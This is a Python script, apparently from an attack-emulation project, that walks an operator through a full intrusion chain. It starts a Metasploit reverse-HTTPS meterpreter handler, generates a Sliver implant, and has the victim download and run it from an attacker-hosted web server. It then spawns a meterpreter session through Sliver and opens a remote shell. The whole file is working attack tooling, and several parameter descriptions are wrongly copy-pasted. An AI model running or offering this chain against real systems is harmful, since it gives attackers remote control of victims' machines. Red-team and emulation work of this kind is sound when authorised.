
import asyncio
import questionary
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
    from attack_executor.exploit.Metasploit import MetasploitExecutor

    console.print(f"[bold cyan]\n📌[Metasploit Executor] Step 1 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")
    default_val = "None"
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST [default: {default_val}]: [/]"
    ) or default_val

    if not user_input and False:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan]\n📌[Metasploit Executor] Step 1 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")
    default_val = "None"
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT [default: {default_val}]: [/]"
    ) or default_val

    if not user_input and False:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    # Metasploit configuration
    with console.status("[bold green]Configuring Metasploit payload..."):
        metasploit_executor = MetasploitExecutor(config=config)
        metasploit_executor.exploit_and_execute_payload(
            exploit_module_name="exploit/multi/handler",
            payload_module_name="windows/meterpreter_reverse_https",
            LHOST=user_params["LHOST"], LPORT=user_params["LPORT"]
    )
    metasploit_sessionid = metasploit_executor.select_session(
    )

    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config=config)

    async def executor_sliver_implant_generation():
        console.print(
            "[bold deep_sky_blue4]Generating the command to create a Sliver payload...[/bold deep_sky_blue4]"
        )

        # collect user input
        protocol = await questionary.select(
            "Select protocol", choices=["mtls", "http", "https"]
        ).ask_async()
        lhost = await questionary.text(
            "Enter listening address",
            default="192.168.146.129",
        ).ask_async()
        lport = await questionary.text(
            "Enter listening port",
            default="9001",
            validate=lambda x: x.isdigit() and 1 <= int(x) <= 65535 if x else False,
        ).ask_async()
        os_type = await questionary.select(
            "Select target OS",
            choices=["windows", "linux", "macos"],
        ).ask_async()
        arch = await questionary.select(
            "Select architecture",
            choices=["64bit", "32bit"],
        ).ask_async()
        save_path = await questionary.text(
            "Save path", default="/home/user/Downloads"
        ).ask_async()
        command = f"sliver generate --{protocol} {lhost}:{lport} --os {os_type} --arch {arch} --save {save_path}"
        console.print(
            f"[bold violet]Step: Commands to Generate Sliver Implant[/]", justify="left"
        )
        console.print(
            "─" * min(50, len("Commands to Generate Sliver Implant") + 10),
            style="dim violet",
        )
        console.print(f"[bold deep_sky_blue4]Commands to execute:[/]", justify="left")
        console.print(f"  [dim cyan]└─>[/] [pale_green3]{command}[/]")

        confirmed = confirm_action()
        if not confirmed:
            console.print(
                "Step canceled. Please ensure you have completed the manual steps."
            )
            return
    await executor_sliver_implant_generation()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH}
        """)
    confirm_action()


    # Sliver-session selection
    console.print("[bold cyan]\n[Sliver Executor] Session Selection[/]")
    sliver_sessionid = await sliver_executor.select_sessions()

    user_params["SessionID"] = sliver_sessionid

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 5 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Payload[/]")
    console.print(f"  Description: IP address of the attacker machine")
    default_val = "None"
    user_input = console.input(
        f"[bold]➤ Enter value for Payload [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: Payload")
    user_params["Payload"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 5 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")
    default_val = "None"
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 5 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: IP address of the attacker machine")
    default_val = "None"
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = int(user_input)

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: msf[/]")
    confirm_action()
    try:
        await sliver_executor.msf(user_params["SessionID"], user_params["Payload"], user_params["LHOST"], user_params["LPORT"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    # Meterpreter Session Selection
    console.print("[bold cyan]\n[Meterpreter Executor] Session Selection[/]")
    metasploit_sessionid = metasploit_executor.select_meterpreter_session()

    user_params["meterpreter_sessionid"] = metasploit_sessionid

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: shell[/]")
    confirm_action()
    try:
        metasploit_executor.shell(user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

if __name__ == "__main__":
    asyncio.run(main())
